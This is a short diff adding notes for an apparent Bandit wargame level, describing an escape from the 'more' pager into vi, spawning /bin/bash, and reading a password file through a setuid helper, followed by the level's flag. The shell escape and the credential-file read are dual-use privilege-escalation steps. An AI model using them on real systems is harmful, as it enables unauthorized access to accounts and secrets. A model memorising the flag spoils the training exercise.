@@ -1,0 +1,13 @@
+# Again I needed some help...
+# After completing level 26, work is still not done, you need a shell!
+
+use:
+Enter vi like in lvl 26 (abusing the more command)
+
+:set shell=/bin/bash
+:shell
+
+./bandit27_do cat /etc/bandit_pass/bandit27
+
+flag:
+3ba3118a22e93127a4ed485be72ef5ea
